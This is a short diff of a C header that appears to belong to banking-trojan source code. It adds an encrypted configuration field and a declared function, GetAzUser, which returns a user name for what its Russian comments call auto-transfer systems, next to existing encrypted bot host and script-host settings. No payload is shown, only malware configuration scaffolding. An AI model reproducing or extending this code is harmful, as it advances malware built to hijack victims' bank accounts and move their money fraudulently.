@@ -20,19 +20,37 @@
 
 #include "GetApi.h"
 #include "Strings.h"
+#include "Strings.h"
 #include "BotConfig.h"
 
 
 
 #define AZCONFIG_PARAM_SIZE_HOSTS       256
 #define AZCONFIG_PARAM_SIZE_SCRIPTHOSTS 256
+#define AZCONFIG_PARAM_SIZE_AZUSER      9
 
 
 #define AZCONFIG_PARAM_NAME_HOSTS       "__AZ_HOSTS__\0"
 #define AZCONFIG_PARAM_NAME_SCRIPTHOSTS "__AZ_SCRIPTS_HOSTS__\0"
+#define AZCONFIG_PARAM_NAME_AZUSER      "_AZ_USER"
 
 #define AZCONFIG_PARAM_ENCRYPTED_HOSTS        true
 #define AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS  true
+#define AZCONFIG_PARAM_ENCRYPTED_AZUSER       true
+
+
+
+
+
+//---------------------------------------------------
+//  GetAzUser -Функция возвращает имя пользователя
+//  для систем автозалива
+//---------------------------------------------------
+string GetAzUser();
+
+
+
+
 
 //----------------------------------------------------
 // GetAzHost - Функция возвращает первый рабочий хост
